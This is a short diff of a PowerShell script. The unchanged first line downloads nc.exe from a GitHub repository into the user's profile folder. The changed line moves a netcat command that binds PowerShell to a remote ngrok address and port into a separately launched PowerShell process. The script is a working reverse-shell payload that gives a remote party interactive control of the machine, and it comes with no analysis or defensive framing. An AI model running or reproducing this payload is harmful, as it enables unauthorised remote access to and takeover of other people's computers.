@@ -1,2 +1,2 @@
 invoke-webrequest -uri "https://github.com/4V4loon/tools/blob/master/nc.exe?raw=true" -out $env:userprofile\nc.exe
-cmd /c "$env:userprofile\nc.exe -e powershell 2.tcp.ngrok.io 16455"
+start powershell {cmd /c "$env:userprofile\nc.exe -e powershell 2.tcp.ngrok.io 16455"}
